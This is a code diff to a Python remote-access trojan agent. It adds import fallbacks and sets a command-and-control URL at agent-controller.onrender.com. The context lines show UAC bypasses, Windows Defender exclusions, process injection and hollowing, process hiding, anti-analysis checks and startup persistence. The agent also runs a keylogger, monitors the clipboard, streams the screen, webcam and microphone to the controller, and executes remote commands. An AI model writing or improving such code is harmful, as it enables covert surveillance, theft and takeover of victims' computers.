@@ -22,10 +22,48 @@ import json
 import uuid
 import socket
 import platform
-import psutil
+try:
+    import psutil
+    PSUTIL_AVAILABLE = True
+except ImportError:
+    PSUTIL_AVAILABLE = False
+    psutil = None
+
 import ctypes
 from ctypes import wintypes
 import queue
+
+# Additional imports with error handling
+try:
+    import mss
+    import numpy as np
+    import cv2
+    MSS_AVAILABLE = True
+    NUMPY_AVAILABLE = True
+    CV2_AVAILABLE = True
+except ImportError:
+    MSS_AVAILABLE = False
+    NUMPY_AVAILABLE = False
+    CV2_AVAILABLE = False
+
+try:
+    import pygame
+    PYGAME_AVAILABLE = True
+except ImportError:
+    PYGAME_AVAILABLE = False
+
+try:
+    import pynput
+    from pynput import keyboard, mouse
+    PYNPUT_AVAILABLE = True
+except ImportError:
+    PYNPUT_AVAILABLE = False
+
+try:
+    import requests
+    REQUESTS_AVAILABLE = True
+except ImportError:
+    REQUESTS_AVAILABLE = False
 
 # Platform detection
 WINDOWS_AVAILABLE = False
@@ -255,7 +293,7 @@ class UACBypassTechniques:
     
     def bypass_uac_token_manipulation(self):
         """UAC bypass using token manipulation (UACME Method 35)"""
-        if not WINDOWS_AVAILABLE:
+        if not WINDOWS_AVAILABLE or not PSUTIL_AVAILABLE:
             return False
         
         try:
@@ -798,13 +836,31 @@ CLIPBOARD_BUFFER = []
 LAST_CLIPBOARD_CONTENT = ""
 
 # --- Audio Config ---
-CHUNK = 1024
-FORMAT = pyaudio.paInt16
-CHANNELS = 1
-RATE = 44100
+try:
+    import pyaudio
+    CHUNK = 1024
+    FORMAT = pyaudio.paInt16
+    CHANNELS = 1
+    RATE = 44100
+    PYAUDIO_AVAILABLE = True
+except ImportError:
+    PYAUDIO_AVAILABLE = False
+    CHUNK = 1024
+    FORMAT = None
+    CHANNELS = 1
+    RATE = 44100
 
 # --- WebSocket Client ---
-sio = socketio.Client()
+try:
+    import socketio
+    sio = socketio.Client()
+    SOCKETIO_AVAILABLE = True
+except ImportError:
+    SOCKETIO_AVAILABLE = False
+    sio = None
+
+# --- Server Configuration ---
+SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL
 
 # --- Privilege Escalation Functions ---
 
@@ -1045,7 +1101,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
         
         # For demonstration, we'll use a different approach
         # Copy a legitimate system DLL and modify PATH
-        system32_path = os.environ.get('SystemRoot', 'C:\Windows') + '\System32'
+        system32_path = os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32'
         
         # Add temp directory to PATH so pkgmgr.exe finds our DLL first
         current_path = os.environ.get('PATH', '')
@@ -1121,7 +1177,7 @@ def bypass_uac_silentcleanup():
             f.write(batch_content)
         
         # Temporarily modify windir environment
-        original_windir = os.environ.get('windir', 'C:\Windows')
+        original_windir = os.environ.get('windir', 'C:\\Windows')
         os.environ['windir'] = fake_windir
         
         try:
@@ -1142,7 +1198,7 @@ def bypass_uac_silentcleanup():
 
 def bypass_uac_token_manipulation():
     """UAC bypass using token manipulation (UACME Method 35)."""
-    if not WINDOWS_AVAILABLE:
+    if not WINDOWS_AVAILABLE or not PSUTIL_AVAILABLE:
         return False
     
     try:
@@ -1972,8 +2028,8 @@ def disable_defender_powershell():
         exclusion_paths = [
             os.path.dirname(os.path.abspath(__file__)),
             tempfile.gettempdir(),
-            os.path.expanduser("~\Downloads"),
-            os.path.expanduser("~\Documents"),
+            os.path.expanduser("~\\Downloads"),
+            os.path.expanduser("~\\Documents"),
         ]
         
         for path in exclusion_paths:
@@ -2111,6 +2167,8 @@ def hollow_process():
 
 def inject_into_trusted_process():
     """Inject into a trusted process."""
+    if not PSUTIL_AVAILABLE:
+        return False
     try:
         # Find explorer.exe process
         for proc in psutil.process_iter(['pid', 'name']):
@@ -2362,7 +2420,7 @@ def add_firewall_exception():
 
 def hide_process():
     """Attempt to hide the current process from task manager."""
-    if not WINDOWS_AVAILABLE:
+    if not WINDOWS_AVAILABLE or not PSUTIL_AVAILABLE:
         return False
     
     try:
@@ -2448,6 +2506,8 @@ def setup_persistence():
 
 def anti_analysis():
     """Anti-analysis and evasion techniques."""
+    if not PSUTIL_AVAILABLE:
+        return False
     try:
         # Check for common analysis tools
         analysis_processes = [
@@ -2589,6 +2649,11 @@ def stream_screen(agent_id):
     This function runs in a separate thread.
     """
     global STREAMING_ENABLED
+    
+    if not all([MSS_AVAILABLE, NUMPY_AVAILABLE, CV2_AVAILABLE, REQUESTS_AVAILABLE]):
+        print("Required modules not available for screen streaming")
+        return
+    
     url = f"{SERVER_URL}/stream/{agent_id}"
     headers = {'Content-Type': 'image/jpeg'}
 
@@ -2621,6 +2686,11 @@ def stream_camera(agent_id):
     This function runs in a separate thread.
     """
     global CAMERA_STREAMING_ENABLED
+    
+    if not all([CV2_AVAILABLE, REQUESTS_AVAILABLE]):
+        print("Required modules not available for camera streaming")
+        return
+    
     url = f"{SERVER_URL}/camera/{agent_id}"
     headers = {'Content-Type': 'image/jpeg'}
 
@@ -2656,6 +2726,11 @@ def stream_audio(agent_id):
     This function runs in a separate thread.
     """
     global AUDIO_STREAMING_ENABLED
+    
+    if not all([PYAUDIO_AVAILABLE, REQUESTS_AVAILABLE]):
+        print("Required modules not available for audio streaming")
+        return
+    
     url = f"{SERVER_URL}/audio/{agent_id}"
     
     try:
@@ -2741,6 +2816,8 @@ def stop_camera_streaming():
 def on_key_press(key):
     """Callback for key press events."""
     global KEYLOG_BUFFER
+    if not PYNPUT_AVAILABLE:
+        return
     try:
         if hasattr(key, 'char') and key.char is not None:
             # Regular character
@@ -2775,6 +2852,10 @@ def start_keylogger(agent_id):
     """Start the keylogger."""
     global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
     if not KEYLOGGER_ENABLED:
+        if not PYNPUT_AVAILABLE:
+            print("Pynput not available for keylogging")
+            return
+        
         KEYLOGGER_ENABLED = True
         
         # Start keyboard listener
@@ -2916,6 +2997,9 @@ def handle_voice_playback(command_parts):
         if len(command_parts) < 2:
             return "Invalid voice command format"
         
+        if not PYGAME_AVAILABLE:
+            return "Pygame not available for voice playback"
+        
         audio_content_b64 = command_parts[1]
         
         # Decode base64 audio
@@ -2991,48 +3075,58 @@ def execute_command(command):
     except Exception as e:
         return f"Command execution failed: {e}"
 
-@sio.event
-def connect():
-    agent_id = get_or_create_agent_id()
-    print(f"Connected to server. Registering with agent_id: {agent_id}")
-    sio.emit('agent_connect', {'agent_id': agent_id})
+if SOCKETIO_AVAILABLE:
+    @sio.event
+    def connect():
+        agent_id = get_or_create_agent_id()
+        print(f"Connected to server. Registering with agent_id: {agent_id}")
+        sio.emit('agent_connect', {'agent_id': agent_id})
 
-@sio.event
-def disconnect():
-    print("Disconnected from server.")
+    @sio.event
+    def disconnect():
+        print("Disconnected from server.")
 
-@sio.on('command')
-def on_command(data):
-    agent_id = get_or_create_agent_id()
-    command = data.get("command")
-    output = ""
+    @sio.on('command')
+    def on_command(data):
+        agent_id = get_or_create_agent_id()
+        command = data.get("command")
+        output = ""
 
-    internal_commands = {
-        "start-stream": lambda: start_streaming(agent_id),
-        "stop-stream": stop_streaming,
-        "start-audio": lambda: start_audio_streaming(agent_id),
-        "stop-audio": stop_audio_streaming,
-        "start-camera": lambda: start_camera_streaming(agent_id),
-        "stop-camera": stop_camera_streaming,
-        "start-keylogger": lambda: start_keylogger(agent_id),
-        "stop-keylogger": stop_keylogger,
-        "start-clipboard": lambda: start_clipboard_monitor(agent_id),
-        "stop-clipboard": stop_clipboard_monitor,
-    }
+        internal_commands = {
+            "start-stream": lambda: start_streaming(agent_id),
+            "stop-stream": stop_streaming,
+            "start-audio": lambda: start_audio_streaming(agent_id),
+            "stop-audio": stop_audio_streaming,
+            "start-camera": lambda: start_camera_streaming(agent_id),
+            "stop-camera": stop_camera_streaming,
+            "start-keylogger": lambda: start_keylogger(agent_id),
+            "stop-keylogger": stop_keylogger,
+            "start-clipboard": lambda: start_clipboard_monitor(agent_id),
+            "stop-clipboard": stop_clipboard_monitor,
+        }
 
-    if command in internal_commands:
-        output = internal_commands[command]()
-    elif command.startswith("upload-file:"):
-        output = handle_file_upload(command.split(":", 2))
-    elif command.startswith("download-file:"):
-        output = handle_file_download(command.split(":", 1), agent_id)
-    elif command.startswith("play-voice:"):
-        output = handle_voice_playback(command.split(":", 1))
-    elif command != "sleep":
-        output = execute_command(command)
+        if command in internal_commands:
+            output = internal_commands[command]()
+        elif command.startswith("upload-file:"):
+            output = handle_file_upload(command.split(":", 2))
+        elif command.startswith("download-file:"):
+            output = handle_file_download(command.split(":", 1), agent_id)
+        elif command.startswith("play-voice:"):
+            output = handle_voice_playback(command.split(":", 1))
+        elif command != "sleep":
+            output = execute_command(command)
+        
+        if output:
+            sio.emit('command_result', {'agent_id': agent_id, 'output': output})
+else:
+    def connect():
+        print("SocketIO not available")
     
-    if output:
-        sio.emit('command_result', {'agent_id': agent_id, 'output': output})
+    def disconnect():
+        print("SocketIO not available")
+    
+    def on_command(data):
+        print("SocketIO not available")
 
 if __name__ == "__main__":
     if WINDOWS_AVAILABLE:
@@ -3045,6 +3139,10 @@ if __name__ == "__main__":
     add_to_startup()
     agent_id = get_or_create_agent_id()
     print(f"Agent starting with ID: {agent_id}")
+    
+    if not SOCKETIO_AVAILABLE:
+        print("SocketIO not available. Cannot connect to server.")
+        sys.exit(1)
     
     while True:
         try:
